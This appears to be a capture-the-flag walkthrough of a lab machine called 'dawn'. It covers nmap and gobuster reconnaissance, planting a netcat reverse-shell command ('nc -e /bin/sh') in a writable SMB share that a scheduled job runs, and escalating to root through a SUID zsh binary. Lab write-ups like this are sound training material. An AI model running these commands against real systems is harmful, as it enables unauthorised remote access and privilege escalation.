192.168.154.11

add 192.168.154.11 to /etc/hosts as dawn.pg

NMAP scan: nmap -sC -sV -vv 192.168.154.11
    ![](/Screenshots/2022-10-10-08-08-35.png)

gobuster: gobuster web for web discovery using 2.3-medium.txt from seclist
    ![](/Screenshots/2022-10-10-08-12-25.png)

/logs:
    ![](/Screenshots/2022-10-10-08-13-02.png)

management.log:
    ![](/Screenshots/2022-10-10-08-14-59.png)

Management.log is a pspy64 leak. Here we can see that there's scheduled file execution:

    "smbclient -L 192.168.154.11" 
shows that ITDEPT is a directory, so we can try to access it as guest.

    smbclient \\\\192.168.154.11\\ITDEPT

we can access it and also write to it, with the scheduled file execution we can get a shell

    echo "nc -e /bin/sh 0.0.0.0 4444" > production-control

Now upload production-control to the SMB set up a nc listener and wait.

We have a basic shell as dawn.

first flag secured!

    sudo -l 
reveals we have NOPASS execution ofn mysql, but running it doesn't really help us since we need root's pw.

    find / -perm /4000 2>/dev/null

Shows us that zsh is set as SUID

    /usr/bin/zsh -p
and we're root. Root flag secured.

 
    